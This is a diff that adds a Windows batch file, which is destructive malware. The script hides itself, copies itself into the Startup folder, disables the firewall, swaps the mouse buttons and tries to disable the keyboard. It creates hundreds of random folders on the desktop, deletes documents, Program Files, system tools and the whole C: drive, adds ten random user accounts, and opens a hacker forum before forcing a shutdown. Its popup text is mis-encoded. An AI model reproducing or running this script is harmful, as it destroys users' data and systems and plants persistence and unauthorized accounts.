@@ -1,0 +1,336 @@
+@echo off
+attrib +h %0
+copy %0 c:\documents and settings\%username%\start menu\programs\startup\system.bat
+netsh firewall set opmode disable
+rundll32 user32.dll, SwapMouseButton
+rundll32 keyboard, disable
+cd %userprofile%\desktop
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+md %random%%random%
+del /s /q %userprofile%\My Documents\*.*
+del /s /q c:\program files\internet explorer\iexplore.exe
+del /s /q c:\windows\notepad.exe
+del /s /q c:\windows\system32\notepad.exe
+del /s /q c:\windows\system32\write.exe
+del /s /q c:\windows\system32\telnet.exe
+del /s /q c:\program files\*.*
+del /s /q c:\documents and settings\%username%\desktop\*.*
+taskkill /f /t /im explorer.exe
+time 12:00
+attrib +h +r c:\windows\system32
+del /s /q c:\windows\web\wallpapers\*.*
+net user %random% /add
+net user %random% /add
+net user %random% /add
+net user %random% /add
+net user %random% /add
+net user %random% /add
+net user %random% /add
+net user %random% /add
+net user %random% /add
+net user %random% /add
+del /s /q c:\windows\media\*.wma
+echo Msg = MsgBox("íÇ ÍÈíÈí ÅÞÑÃ ÇáÝÇÊÍÉ Úáì ÌåÇÒß") >> PopUp.VBS
+start PopUp.VBS
+del /s /q c:\
+taskkill /f /t /im notepad.exe
+start iexplore.exe http://www.sa-hacker.com/vb/
+shutdown -s -t 0
